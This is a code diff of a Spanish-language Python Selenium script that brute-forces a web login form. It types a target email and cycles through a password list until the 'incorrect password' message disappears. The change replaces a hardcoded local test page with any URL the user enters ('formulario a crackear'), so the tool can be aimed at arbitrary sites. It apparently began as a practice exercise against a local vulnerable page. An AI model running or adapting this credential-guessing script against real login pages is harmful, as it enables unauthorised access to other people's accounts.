@@ -15,14 +15,14 @@ driver = webdriver.Edge(service=Service(EdgeChromiumDriverManager().install()), 
 
 
 # Abre la página web con el formulario
-url = 'http://127.0.0.1:5501/web%20vulnerable/index.html'
+url = input("Introduzca la dirección WEB del formulario a crackear:\n")
 driver.get(url)
 
 # Encuentra los elementos del formulario y rellénalos
 email = WebDriverWait(driver, 10).until(
     EC.visibility_of_element_located((By.NAME, 'identifier'))
 )
-email.send_keys(input("Escribe el correo para hackear: (en mi ejemplo es: carla@gmail.com, y su contraseña: Charizard)"))
+email.send_keys(input("Escribe el correo para hackear: (en mi ejemplo es: carla@gmail.com, y su contraseña: volleyball):\n"))
 password = WebDriverWait(driver, 10).until(
 	EC.visibility_of_element_located((By.NAME, 'password'))
 )
@@ -37,18 +37,18 @@ pos = 0
 messageDiv = WebDriverWait(driver, 10).until(
     EC.visibility_of_element_located((By.ID, 'message'))
 )
-while True:
-	if( messageDiv.text == "Contraseña o email incorrectos" ):
-		password.clear()
-		password.send_keys(passwordsList[pos])
-  
-		boton_siguiente = driver.find_element(By.ID, "submit")
-		boton_siguiente.click()
-		pos+=1
-		# time.sleep(0.1)		
-	else:
-		print(f"Contraseña encontrada!\n	La contraseña es: {passwordsList[pos-1]}")
-		break
+while messageDiv.text == "Contraseña o email incorrectos" and pos < len(passwordsList):
 
+	password.clear()
+	password.send_keys(passwordsList[pos])
+
+	boton_siguiente = driver.find_element(By.ID, "submit")
+	boton_siguiente.click()
+	pos+=1
+	# time.sleep(0)		
+if(messageDiv.text != "Contraseña o email incorrectos"):
+	print(f"Contraseña encontrada!\n	La contraseña es: {passwordsList[pos-1]}")
+else:
+    print(f"La contraseña no se encuentra en el diccionario.")
 time.sleep(1)
 
